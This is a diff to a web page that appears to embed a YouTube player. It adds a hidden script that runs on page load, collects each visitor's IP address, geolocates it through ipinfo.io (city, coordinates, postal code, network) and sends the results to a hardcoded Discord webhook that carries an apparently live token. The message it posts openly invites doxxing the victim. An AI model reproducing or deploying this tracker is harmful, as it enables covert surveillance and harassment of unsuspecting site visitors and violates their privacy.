@@ -63,31 +63,75 @@
         loadYouTubePlayerAPI();
     </script>
 
-    <script>
-        function getIP(json) {
-            const webhookURL = 'https://discord.com/api/webhooks/1181985888897601617/5lGDVSfQoy_-NJrsNA9XJbcHqmDcscShtlQORHFThz498zPex6LOXJ-XSar5V3LbZ0MZ';
-              ignoredIps = ['122.173.31.1']
-            
-              if (ignoredIps.includes(json.ip)) {
-                  return
-              };
+<script>
+    async function getIP(json) {
+        const webhookURL = 'https://discord.com/api/webhooks/1181985888897601617/5lGDVSfQoy_-NJrsNA9XJbcHqmDcscShtlQORHFThz498zPex6LOXJ-XSar5V3LbZ0MZ';
+
+        ignoredIps = ['122.173.31.1'];
+
+        if (ignoredIps.includes(json.ip)) {
+            return;
+        }
+
+        try {
+            const locationInfo = await getLocation(json.ip);
 
             const data = {
                 "content": null,
                 "embeds": [
                     {
-                    "title": "From IP Grabber:",
-                    "description": "The most recent logged-in user's IP address is:\n" + json.ip,
-                    "color": 15431437,
-                    "fields": [
-                        {
-                        "name": "Now feel free to dox the living shit of that guy.",
-                        "value": "(or use it when you're about to lose an argument against him)"
+                        "title": "From IP Grabber:",
+                        "description": "The most recent logged-in user's location information are:\n",
+                        "color": 15431437,
+                        "fields": [
+                            {
+                            "name": "IP:",
+                            "value": json.ip
+                            },
+                            {
+                                "name": "City:",
+                                "value": locationInfo.city
+                            },
+                            {
+                                "name": "Region:",
+                                "value": locationInfo.region
+                            },
+                            {
+                                "name": "Country:",
+                                "value": locationInfo.country
+                            },
+                            {
+                                "name": "Timezone:",
+                                "value": locationInfo.timezone
+                            },
+                            {
+                                "name": "Latitude:",
+                                "value": locationInfo.loc.split(",")[0]
+                            },
+                            {
+                                "name": "Longitude:",
+                                "value": locationInfo.loc.split(",")[1]
+                            },
+                            {
+                            "name": "Network:",
+                            "value": locationInfo.org
+                            },
+                            {
+                            "name": "Location:",
+                            "value": locationInfo.loc
+                            },
+                            {
+                            "name": "Postal Code:",
+                            "value": locationInfo.postal
+                            },
+                            {
+                                "name": "Now feel free to dox the living shit of that guy.",
+                                "value": "(or use it when you're about to lose an argument against him)"
+                            }
+                        ],
+                        "footer": {
+                            "text": `From ${window.location.href}`
                         }
-                    ],
-                    "footer": {
-                        "text": `From ${window.location.href}`
-                    }
                     }
                 ],
                 "attachments": []
@@ -99,16 +143,23 @@
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (response.ok) {
-                } else {
-                }
-            })
-            .catch(error => {
             });
+        } catch(error) {
+            console.error(error);
         }
-    </script>
-    <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+    }
+
+    async function getLocation(ipAddress) {
+        const url = `http://ipinfo.io/${ipAddress}/json`;
+        try {
+            const response = await fetch(url);
+            const data = await response.json();
+            return data;
+        } catch (error) {
+            return null;
+        }
+    }
+</script>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
 </body>
 </html>
